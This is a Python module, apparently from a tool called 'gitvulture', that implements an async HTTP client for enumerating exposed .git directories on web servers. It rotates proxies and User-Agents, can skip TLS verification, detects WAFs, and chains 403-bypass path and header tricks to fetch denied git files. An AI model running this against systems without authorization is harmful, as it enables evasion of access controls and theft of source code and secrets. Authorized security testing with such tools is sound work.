"""Resilient async HTTP client with rate limiting, proxy rotation and bypass support."""
from __future__ import annotations

import asyncio
import itertools
import random
import ssl
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse

import httpx

from ..config import (
    BYPASS_HEADERS,
    BYPASS_PATH_VARIANTS,
    DEFAULT_CONCURRENCY,
    DEFAULT_RATE_LIMIT,
    DEFAULT_RETRIES,
    DEFAULT_TIMEOUT,
    USER_AGENTS,
    WAF_SIGNATURES,
)
from ..logger import get_logger

# Soft-404 fingerprints (body length + first bytes) cached per host
_SOFT404_MARKERS = (
    b"<title>404", b"Not Found", b"page not found",
    b"NoSuchKey", b"AccessDenied",
    b"<title>Access Denied", b"cf-error-details",
)


@dataclass
class FetchResult:
    url: str
    status: int
    content: bytes = b""
    headers: dict = field(default_factory=dict)
    bypass_used: Optional[str] = None
    error: Optional[str] = None

    @property
    def ok(self) -> bool:
        return 200 <= self.status < 300 and len(self.content) > 0 and self.status != 204


class RateLimiter:
    """Simple async token-bucket rate limiter (req/sec)."""

    def __init__(self, rate: float):
        self.rate = max(1.0, float(rate))
        self._interval = 1.0 / self.rate
        self._next = 0.0
        self._lock = asyncio.Lock()

    async def acquire(self) -> None:
        async with self._lock:
            now = asyncio.get_event_loop().time()
            wait = self._next - now
            if wait > 0:
                await asyncio.sleep(wait)
            self._next = max(now, self._next) + self._interval


class HttpClient:
    """Async HTTP client tailored for .git directory enumeration.

    Features
    --------
    - Async parallel requests with bounded concurrency
    - Adaptive rate limiting (slows on 429/503)
    - SSL bypass (insecure mode)
    - Proxy / rotating proxy support (HTTP / SOCKS via httpx-socks)
    - User-Agent rotation
    - 403 / 404 bypass technique chain (path variants + header tricks)
    - WAF detection
    """

    def __init__(
        self,
        base_url: str,
        *,
        timeout: float = DEFAULT_TIMEOUT,
        concurrency: int = DEFAULT_CONCURRENCY,
        rate_limit: float = DEFAULT_RATE_LIMIT,
        retries: int = DEFAULT_RETRIES,
        insecure: bool = False,
        proxy: Optional[str] = None,
        proxy_list: Optional[list[str]] = None,
        ua_rotate: bool = False,
        bypass_403: bool = False,
        verbose_log=None,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.retries = retries
        self.insecure = insecure
        self.bypass_403 = bypass_403
        self.ua_rotate = ua_rotate
        self._semaphore = asyncio.Semaphore(concurrency)
        self._limiter = RateLimiter(rate_limit)
        self._log = verbose_log or (lambda *a, **kw: None)
        self.log = get_logger()
        self.waf: Optional[str] = None
        self._soft404_sig: dict[str, tuple[int, bytes]] = {}

        # Proxy rotation cycle
        proxies = []
        if proxy:
            proxies.append(proxy)
        if proxy_list:
            proxies.extend(p for p in proxy_list if p)
        self._proxies = proxies
        self._proxy_cycle = itertools.cycle(proxies) if proxies else None

        self._ua_cycle = itertools.cycle(USER_AGENTS)

        # Per-proxy clients (httpx requires the proxy to be set on the client)
        self._clients: dict[Optional[str], httpx.AsyncClient] = {}

    # ------------------------------------------------------------------ #
    # Client management
    # ------------------------------------------------------------------ #
    def _make_client(self, proxy: Optional[str]) -> httpx.AsyncClient:
        verify = False if self.insecure else True
        if self.insecure:
            # Build a permissive SSL ctx that accepts hostname mismatch
            verify = ssl.create_default_context()
            verify.check_hostname = False
            verify.verify_mode = ssl.CERT_NONE
        return httpx.AsyncClient(
            timeout=self.timeout,
            verify=verify,
            follow_redirects=False,
            http2=False,
            proxy=proxy,
            limits=httpx.Limits(max_connections=100, max_keepalive_connections=20),
        )

    def _client_for(self, proxy: Optional[str]) -> httpx.AsyncClient:
        cli = self._clients.get(proxy)
        if cli is None:
            cli = self._make_client(proxy)
            self._clients[proxy] = cli
        return cli

    def _next_proxy(self) -> Optional[str]:
        if self._proxy_cycle:
            return next(self._proxy_cycle)
        return None

    def _next_ua(self) -> str:
        if self.ua_rotate:
            return next(self._ua_cycle)
        return USER_AGENTS[0]

    async def close(self) -> None:
        for cli in self._clients.values():
            try:
                await cli.aclose()
            except Exception:
                pass

    # ------------------------------------------------------------------ #
    # Soft-404 calibration & detection
    # ------------------------------------------------------------------ #
    async def calibrate_soft_404(self) -> None:
        """Hit an unlikely URL once to learn the host's fake-404 fingerprint."""
        host = urlparse(self.base_url).netloc
        if host in self._soft404_sig:
            return
        rand = f"gitvulture-probe-{random.randint(10**9, 10**10)}"
        url = f"{self.base_url}/{rand}"
        r = await self._request(url, _no_calibrate=True)
        if r.status in (200, 206) and r.content:
            self._soft404_sig[host] = (len(r.content), r.content[:64])
            self.log.trace(
                f"soft-404 calibrated for {host} (size={len(r.content)})"
            )

    def _is_soft_404(self, url: str, status: int, body: bytes) -> bool:
        if status not in (200, 206) or not body:
            return False
        host = urlparse(url).netloc
        sig = self._soft404_sig.get(host)
        if sig and len(body) == sig[0] and body[:64] == sig[1]:
            return True
        for m in _SOFT404_MARKERS:
            if m in body[:2048]:
                return True
        return False

    # ------------------------------------------------------------------ #
    # Core request
    # ------------------------------------------------------------------ #
    async def _request(
        self,
        url: str,
        *,
        extra_headers: Optional[dict] = None,
        _no_calibrate: bool = False,
    ) -> FetchResult:
        proxy = self._next_proxy()
        client = self._client_for(proxy)
        headers = {
            "User-Agent": self._next_ua(),
            "Accept": "*/*",
            "Accept-Encoding": "identity",  # avoid gzip surprises on binary objects
        }
        if extra_headers:
            headers.update(extra_headers)

        backoff = 0.5
        last_err: Optional[str] = None
        self.log.payload(f"GET {url}")
        for attempt in range(self.retries):
            try:
                await self._limiter.acquire()
                async with self._semaphore:
                    resp = await client.get(url, headers=headers)
                # Adaptive backoff on rate-limit signals
                if resp.status_code in (429, 503):
                    self.log.warning(
                        f"rate-limited ({resp.status_code}) on {url} — backing off {backoff:.1f}s"
                    )
                    await asyncio.sleep(backoff)
                    backoff *= 2
                    continue
                # Detect WAF once
                if self.waf is None:
                    self.waf = self._detect_waf(resp)
                    if self.waf:
                        self.log.warning(f"WAF detected: {self.waf}")
                soft404 = (not _no_calibrate
                           and self._is_soft_404(url, resp.status_code, resp.content))
                # Surface as 404 in the result so callers stop trusting the body
                status = 404 if soft404 else resp.status_code
                self.log.http("GET", url, status, len(resp.content))
                return FetchResult(
                    url=url,
                    status=status,
                    content=b"" if soft404 else resp.content,
                    headers=dict(resp.headers),
                )
            except (httpx.ConnectError, httpx.ReadTimeout, httpx.ProxyError) as e:
                last_err = f"{type(e).__name__}: {e}"
                self.log.trace(f"transient error: {last_err}")
                await asyncio.sleep(backoff + random.random() * 0.3)
                backoff *= 1.5
            except Exception as e:  # network / TLS errors
                last_err = f"{type(e).__name__}: {e}"
                self.log.trace(f"request error: {last_err}")
                await asyncio.sleep(backoff)
                backoff *= 1.5
        self.log.http("GET", url, 0, 0)
        return FetchResult(url=url, status=0, error=last_err)

    def _detect_waf(self, resp: httpx.Response) -> Optional[str]:
        headers_low = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body_sample = resp.text[:1024].lower() if resp.content else ""
        for waf, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if any(sig in k or sig in v for k, v in headers_low.items()):
                    return waf
                if sig in body_sample:
                    return waf
        return None

    # ------------------------------------------------------------------ #
    # Public API
    # ------------------------------------------------------------------ #
    async def fetch_path(self, git_path: str) -> FetchResult:
        """Fetch a single path under /.git/, attempting bypass if needed."""
        url = f"{self.base_url}/.git/{git_path.lstrip('/')}"
        result = await self._request(url)
        if result.ok or not self.bypass_403:
            return result

        # Only try bypass tricks on 401/403 (true access denial), NOT on 404
        # — burning 12 path variants × 8 header tricks on every missing file
        # would flood the target.
        if result.status not in (401, 403):
            return result

        # Path-based variants
        for tmpl in BYPASS_PATH_VARIANTS:
            variant_path = tmpl.format(path=f".git/{git_path.lstrip('/')}")
            variant_url = f"{self.base_url}{variant_path if variant_path.startswith('/') else '/' + variant_path}"
            r = await self._request(variant_url)
            if r.ok:
                r.bypass_used = f"path:{tmpl}"
                self.log.success(f"403 bypass via path variant '{tmpl}'  →  {git_path}")
                self._log(f"[bypass] path variant succeeded: {tmpl}")
                return r

        # Header-based variants
        for hdr_template in BYPASS_HEADERS:
            hdr = {k: v.format(path=f".git/{git_path.lstrip('/')}") for k, v in hdr_template.items()}
            r = await self._request(url, extra_headers=hdr)
            if r.ok:
                r.bypass_used = f"header:{list(hdr.keys())[0]}"
                self.log.success(f"403 bypass via header '{list(hdr.keys())[0]}'  →  {git_path}")
                self._log(f"[bypass] header succeeded: {list(hdr.keys())[0]}")
                return r

        return result

    async def fetch_paths(self, paths: list[str]) -> list[FetchResult]:
        return await asyncio.gather(*(self.fetch_path(p) for p in paths))
